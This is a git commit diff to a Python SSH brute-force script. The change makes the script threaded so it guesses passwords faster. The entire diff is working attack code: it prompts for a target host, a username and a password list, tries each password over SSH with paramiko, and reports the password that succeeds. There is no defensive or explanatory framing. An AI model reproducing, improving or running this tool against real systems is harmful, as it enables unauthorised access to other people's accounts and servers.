a436d561510c79f43e5db6c47d11eb2246c26f5e
Sivadath <52615657+sivadathdev@users.noreply.github.com>
2022-06-28 15:32:28 +0530

    Update ssh_brute.py
    Made the script threaded to bruteforce faster.

--- ssh-bruteforcer/ssh_brute.py
+++ ssh-bruteforcer/ssh_brute.py
@@ -1,41 +1,42 @@
 import paramiko, socket, os
 from termcolor import colored
+import time, threading
+
+stop_flag = 0
 
 def ssh_connect(password, code=0):
+	global stop_flag
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 	try:
 		ssh.connect(host, port=22, username=username, password=password)
-	except paramiko.AuthenticationException:
-		code=1
-	except socket.error as e:
-		code =2
-
+		stop_flag = 1
+		print(colored(f"[+] Found password, for the account {username} as: {password}",'green'))
+	except:
+		print(colored("[-] Invalid password.",'red'))
 	ssh.close()
-	return code
 
 
 if __name__ == "__main__":
 	host = input("[+] Target address: ")
 	username = input("[+] SSH username: ")
 	input_file = input("[+] Password file: ")
+	print("\n")
 
 	if os.path.exists(input_file) == False:
 		print(f" Please provide a valid path/file")
+		sys.exit(1)
+
+	print(f"* * * Starting threaded SSH bruteforce on {host} for the account: {username} * * *")
 
 	with open(input_file, "r") as file:
 		for line in file.readlines():
+			if stop_flag == 1:
+				t.join()
+				exit()
 			password = line.strip()
-			try:
-				result = ssh_connect(password)
-				if result == 0:
-					print(colored(f"[+] Found password, for the account {username} as: {password}",'green'))
-					break
-				elif result == 1:
-					print(colored("[-] Invalid password.",'red'))
-				elif result == 2:
-					print("Unable to connect.")
-			except Exception as e:
-				print(e)
-				pass
+			t = threading.Thread(target = ssh_connect, args=(password,))
+			t.start()
+			time.sleep(0.5)
+
